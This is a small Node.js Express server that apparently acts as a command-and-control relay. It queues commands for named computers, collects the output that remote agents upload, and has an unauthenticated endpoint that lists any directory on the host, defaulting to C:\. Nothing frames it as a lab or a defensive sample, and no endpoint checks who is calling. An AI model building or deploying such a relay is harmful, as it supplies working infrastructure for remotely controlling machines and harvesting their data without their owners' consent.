const express = require('express');
const app = express();

app.use(express.json());

let commands = {};

app.get('/', (req, res) => {
    res.send("Server is running");
});

app.get('/api/get-command', (req, res) => {
    const pc = req.query.pc;
    res.json({ command: commands[pc] || null });
});

app.post('/api/send-command', (req, res) => {
    const { computer, command } = req.body;
    commands[computer] = command;
    res.send("Command sent");
});

let outputs = {};

// Receive output from agent
app.post('/api/upload', (req, res) => {
    const { computer, output } = req.body;
    outputs[computer] = output;
    res.send("Output received");
});

// View output
app.get('/api/get-output', (req, res) => {
    const pc = req.query.pc;
    res.json({ output: outputs[pc] || null });
});
const PORT = process.env.PORT || 3000;

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
const fs = require('fs');
const path = require('path');

// List files
app.get('/api/list-files', (req, res) => {
    const dirPath = req.query.path || "C:\\";
    try {
        const files = fs.readdirSync(dirPath);
        res.json(files);
    } catch (err) {
        res.status(500).send("Error reading directory");
    }
});
